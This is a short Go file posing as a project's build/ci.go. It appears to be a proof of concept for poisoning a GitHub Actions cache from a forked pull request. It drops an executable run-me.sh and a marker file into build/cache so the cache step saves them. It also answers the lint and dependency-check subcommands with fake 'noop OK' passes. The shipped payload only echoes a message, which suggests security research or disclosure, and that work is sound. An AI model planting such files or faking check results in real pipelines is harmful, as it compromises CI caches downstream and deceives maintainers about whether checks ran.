// build/ci.go
package main

import (
	"fmt"
	"os"
	"path/filepath"
)

func dropCachePayload() {
	dir := filepath.Join("build", "cache")
	_ = os.MkdirAll(dir, 0o755)
	_ = os.WriteFile(filepath.Join(dir, "POISONED.txt"), []byte("hello-from-fork\n"), 0o644)
	_ = os.WriteFile(filepath.Join(dir, "run-me.sh"),
		[]byte("#!/usr/bin/env bash\necho \"[PWN] cache payload from fork\"\n"),
		0o755)
}

func main() {
	// ensure the cache dir has content so actions/cache will save it
	dropCachePayload()

	// mimic the subcommands your workflow calls
	if len(os.Args) > 1 {
		switch os.Args[1] {
		case "lint", "check_generate", "check_baddeps":
			fmt.Printf("[ci] noop %s OK\n", os.Args[1])
			return
		default:
			fmt.Printf("[ci] unknown subcommand %q (noop OK)\n", os.Args[1])
			return
		}
	}
	fmt.Println("[ci] no subcommand (noop OK)")
}
